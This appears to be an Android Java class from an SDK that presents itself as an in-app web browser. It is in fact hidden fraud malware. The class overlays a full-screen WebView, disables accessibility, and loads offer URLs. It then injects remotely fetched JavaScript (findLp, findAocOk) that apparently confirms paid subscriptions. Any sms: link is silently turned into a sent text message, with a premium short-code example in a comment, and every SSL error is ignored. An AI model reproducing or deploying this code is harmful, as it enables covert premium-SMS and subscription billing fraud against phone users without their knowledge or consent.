package com.xxm.sublibrary.view;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.http.SslError;
import android.os.Build;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.xxm.sublibrary.R;
import com.xxm.sublibrary.http.H_okhttp;
import com.xxm.sublibrary.mode.Ma;
import com.xxm.sublibrary.utils.Ujs;
import com.xxm.sublibrary.utils.Ulink;
import com.xxm.sublibrary.utils.Uutil;


/**
 * Created by xlc on 2017/5/24.
 */

public class Va implements View.OnClickListener {


    private static Va instance = null;

    private Context mContext;

    private ImageView stopView, backView, homeView, goView, delete_view;


    private LinearLayout stopViewLinearLayout, homeViewLinearLayout, goViewLinearLauout;

    private WebView mWebView;

    private ProgressBar mProgressBar;

    private boolean isStop = true;

    private FrameLayout dialogProgresslayout;

    private TextView x_dialog_progress;

    private LinearLayout error_layout;

    private String fail_url;

    private String jsdata;

    private int offer_id;

    private String last_finished_url = "";

    private WindowManager windowManager = null;

    private WindowManager.LayoutParams windParams = null;

    private View view = null;

    public static Va getInstance(Context context) {
        if (instance == null) {
            instance = new Va(context);
        }
        return instance;
    }

    private Va(Context context) {
        this.mContext = context;

        initView();

        initWindowMannager();

    }

    private void initJsData() {

        H_okhttp.executorService.execute(new Runnable() {
            @Override
            public void run() {

                jsdata = Ujs.getInstance(mContext).getJsString();

                // //LogUtil.show("init javaScript:" + jsdata);
            }
        });
    }

    private void initWindowMannager() {

        windowManager = (WindowManager) mContext.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);

        windParams = new WindowManager.LayoutParams();

        windParams.width = WindowManager.LayoutParams.MATCH_PARENT;

        windParams.height = WindowManager.LayoutParams.MATCH_PARENT;

        windParams.type = WindowManager.LayoutParams.TYPE_TOAST;

        windParams.format = PixelFormat.RGBA_8888;

        windParams.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_FULLSCREEN;

        windParams.x = 0;

        windParams.y = 0;

        // windParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;

        //         windParams.flags = WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM;

    }


    public void startLoad(Ma offer) {

        //LogUtil.show("startLoad");

        if (mWebView == null) {
            initView();
        }

        String load_url = Ulink.getChangeUrl(offer, mContext, false);

        Uutil.disableAccessibility(mContext);

        Uutil.disableJsIfUrlEncodedFailed(mWebView, load_url);

        mWebView.loadUrl("about:blank");

        initJsData();

        //  Answers.getInstance().logCustom(new CustomEvent("a_sdk_execute_offer").putCustomAttribute("platform_offer", offer.getSub_platform_id() + "_" + offer_id));

        this.offer_id = offer.getOffer_id();

        if (view == null) {

            //LogUtil.show("view == null");

            return;
        }

        if (view.isShown()) {
            windowManager.removeView(view);
        }

        windowManager.addView(view, windParams);

        //LogUtil.w("ac_开始加载链接：" + load_url);

        mWebView.stopLoading();
        mWebView.clearFocus();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url);


    }


    @SuppressLint("NewApi")
    private void destoryView() {
        if (mWebView != null) {
            // Check to make sure the WebView has been removed
            // before calling destroy() so that a memory leak is not created
            ViewGroup parent = (ViewGroup) mWebView.getParent();
            if (parent != null) {
                parent.removeView(mWebView);
            }
            mWebView.stopLoading();
            mWebView.onPause();
            mWebView.clearHistory();
            mWebView.removeAllViews();
            mWebView.destroyDrawingCache();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                //this is causing the segfault occasionally below 4.2
                mWebView.destroy();
            }
            mWebView = null;
        }
    }

    @SuppressLint({"NewApi", "SetJavaScriptEnabled", "AddJavascriptInterface"})
    private void initView() {

        //LogUtil.show("webView  init");

        view = ((LayoutInflater) mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE)).inflate(R.layout.x_webview_layout_w, null, false);

        if (view == null) {
            return;
        }

        delete_view = (ImageView) view.findViewById(R.id.delete_view);

        delete_view.setOnClickListener(this);

        //error_layout
        error_layout = (LinearLayout) view.findViewById(R.id.error_layout);

        error_layout.setOnClickListener(this);

        dialogProgresslayout = (FrameLayout) view.findViewById(R.id.x_dialog_progress);

        x_dialog_progress = (TextView) view.findViewById(R.id.x_dialog_progress_text);

        //停止加载
        stopView = (ImageView) view.findViewById(R.id.stop_webView);
        stopView.setBackgroundResource(R.drawable.x_browser_stop);
        stopViewLinearLayout = (LinearLayout) view.findViewById(R.id.web_stop_linearLayout);
        stopViewLinearLayout.setOnClickListener(this);

        //webView 返回
        backView = (ImageView) view.findViewById(R.id.web_back);
        backView.setBackgroundResource(R.drawable.x_browser_back);
        goViewLinearLauout = (LinearLayout) view.findViewById(R.id.web_back_linearLayout);
        goViewLinearLauout.setOnClickListener(this);

        //webView 向前
        goView = (ImageView) view.findViewById(R.id.web_go);
        goView.setBackgroundResource(R.drawable.x_browser_forward_disable);
        goViewLinearLauout = (LinearLayout) view.findViewById(R.id.web_go_linearLayout);
        goViewLinearLauout.setOnClickListener(this);


        //回到主页
        homeView = (ImageView) view.findViewById(R.id.web_home);
        homeView.setBackgroundResource(R.drawable.x_browser_home);
        homeViewLinearLayout = (LinearLayout) view.findViewById(R.id.web_home_linearLayout);
        homeViewLinearLayout.setOnClickListener(this);

        //进度条
        mProgressBar = (ProgressBar) view.findViewById(R.id.webView_progress);
        mProgressBar.setProgress(0);
        mProgressBar.setMax(100);

        mWebView = (WebView) view.findViewById(R.id.grid_webview);

        mWebView.setLayerType(View.LAYER_TYPE_NONE, null);

        WebSettings settings = mWebView.getSettings();

        //Setting
        settings.setJavaScriptEnabled(true);

        settings.setJavaScriptCanOpenWindowsAutomatically(true);

        settings.setBuiltInZoomControls(true);

        settings.setDisplayZoomControls(false);

        settings.setSupportZoom(true);

        settings.setDomStorageEnabled(true);

        settings.setDatabaseEnabled(true);
        // 全屏显示
        settings.setLoadWithOverviewMode(true);

        settings.setUseWideViewPort(true);

        settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);

        settings.setAllowContentAccess(true);

        settings.setAllowFileAccess(true);

        //
        //        if (Ue.checkNet(mContext)) {
        //
        //            settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        //
        //        } else {
        //
        //            settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        //
        //        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            settings.setAllowFileAccessFromFileURLs(false);
            settings.setAllowUniversalAccessFromFileURLs(false);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) {
            //noinspection deprecation
            settings.setAppCacheMaxSize(Long.MAX_VALUE);
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1) {
            //noinspection deprecation
            settings.setEnableSmoothTransition(true);
        }
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN) {
            settings.setMediaPlaybackRequiresUserGesture(true);
        }

        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        //mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);

        mWebView.setWillNotCacheDrawing(true);


        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP_MR1) {
            //noinspection deprecation
            mWebView.setAnimationCacheEnabled(false);
            //noinspection deprecation
            mWebView.setAlwaysDrawnWithCacheEnabled(false);
        }

        mWebView.addJavascriptInterface(this, "toolbox");

        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);

        mWebView.setWebViewClient(new MwebViewClient());
        mWebView.setWebChromeClient(new WebChroClient());
        mWebView.setDownloadListener(new MyDownloadListener());

        // //LogUtil.info(TAG, "mWebView.getUrl():" + mWebView.getUrl());

    }

    @JavascriptInterface
    public void openImage(String tag, String satisfy_url) {

        if (TextUtils.isEmpty(tag) || TextUtils.isEmpty(satisfy_url)) {
            return;
        }

        // Answers.getInstance().logCustom(new CustomEvent("a_" + tag));

        //LogUtil.show("activity_offer_id:" + offer_id);

        //LogUtil.show("activity_webView get js click:" + tag);

        //LogUtil.show("activity_satisfy_url:" + satisfy_url);


    }

    @Override
    public void onClick(View v) {

        int i = v.getId();

        if (i == R.id.web_home_linearLayout) {

            while (mWebView.canGoBack()) {

                mWebView.goBack();

            }

        } else if (i == R.id.web_stop_linearLayout) {//


            if (isStop) {

                stopView.setBackgroundResource(R.drawable.x_browser_refresh_normal);

                mWebView.stopLoading();

                isStop = false;

            } else {

                stopView.setBackgroundResource(R.drawable.x_browser_stop);

                isStop = true;

                mWebView.reload();
            }

        } else if (i == R.id.web_back_linearLayout) {
            if (mWebView != null) {

                // //LogUtil.info(TAG, "后退");

                if (mWebView.canGoBack()) {

                    // mWebView.goBack();

                    error_layout.setVisibility(View.GONE);

                    mWebView.goBack();

                }

            }

        } else if (i == R.id.web_go_linearLayout) {
            if (mWebView != null) {

                if (mWebView.canGoForward()) {

                    // //LogUtil.info(TAG, "前进");

                    error_layout.setVisibility(View.GONE);

                    mWebView.goForward();

                }
            }

        } else if (i == R.id.error_layout) {
            stopView.setBackgroundResource(R.drawable.x_browser_stop);

            isStop = true;

            mWebView.loadUrl(fail_url);

            error_layout.setVisibility(View.GONE);


        } else if (i == R.id.delete_view) {
            if (view != null && view.isShown()) {
                windowManager.removeView(view);
            }
        }
    }

    private class MwebViewClient extends WebViewClient {

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {

            if (url.startsWith("sms:")) {

                //sms:36686?body=ON FJG

                String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));

                String content = url.substring(url.indexOf("=") + 1, url.length());

                SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                return true;
            }

            return super.shouldOverrideUrlLoading(view, url);
        }


        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {

            super.onPageStarted(view, url, favicon);

            dialogProgresslayout.setVisibility(View.VISIBLE);

            //showDialog();

            stopView.setBackgroundResource(R.drawable.x_browser_stop);

            isStop = true;

            mProgressBar.setVisibility(View.VISIBLE);

        }

        @Override
        public boolean shouldOverrideKeyEvent(WebView view, KeyEvent event) {

            return super.shouldOverrideKeyEvent(view, event);
        }

        @Override
        public void onPageFinished(WebView view, String url) {

            super.onPageFinished(view, url);

            //LogUtil.show("activity_onPageFinished:" + url);

            if (url.equals(last_finished_url) || url.contains("about:blank")) {
                return;
            }

            last_finished_url = url;

            if (!TextUtils.isEmpty(jsdata) && mWebView != null) {

                //LogUtil.w("activity_开始注入js");

                mWebView.loadUrl("javascript:" + jsdata);

                mWebView.loadUrl("javascript:findLp(" + offer_id + ")");

                mWebView.loadUrl("javascript:findAocOk()");

                //handler.sendEmptyMessageDelayed(0, 2000);

            }
            stopView.setBackgroundResource(R.drawable.x_browser_refresh_normal);

            isStop = false;

        }

        //
        @Override
        public void onLoadResource(WebView view, String url) {

            ////LogUtil.info(TAG, "decode_url:" + view.getUrl());

            if (view.canGoForward()) {

                goView.setBackgroundResource(R.drawable.x_browser_forward_press);

            } else {

                goView.setBackgroundResource(R.drawable.x_browser_forward_disable);
            }

            if (view.canGoBack()) {

                backView.setBackgroundResource(R.drawable.x_browser_back_press);

            } else {

                backView.setBackgroundResource(R.drawable.x_browser_back);

            }

        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);

            backView.setBackgroundResource(R.drawable.x_browser_back_press);

            view.stopLoading();

            view.clearView();

            String data = " ";

            view.loadUrl("javascript:document.body.innerHTML=\"" + data + "\"");

            fail_url = failingUrl;

            error_layout.setVisibility(View.VISIBLE);

            stopView.setBackgroundResource(R.drawable.x_browser_refresh_normal);

            isStop = false;
        }

        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            handler.proceed();
        }
    }


    private class MyDownloadListener implements DownloadListener {

        @Override
        public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {


        }
    }

    /**
     * WebChromeClient
     */
    private class WebChroClient extends WebChromeClient {

        @Override
        public void onProgressChanged(WebView view, int newProgress) {

            mProgressBar.setVisibility(View.VISIBLE);

            mProgressBar.setProgress(newProgress);

            if (x_dialog_progress != null) {
                x_dialog_progress.setText(newProgress + "%");
            }

            if (newProgress > 75) {

                mProgressBar.setVisibility(View.GONE);

                dialogProgresslayout.setVisibility(View.GONE);


            }
        }


    }
}
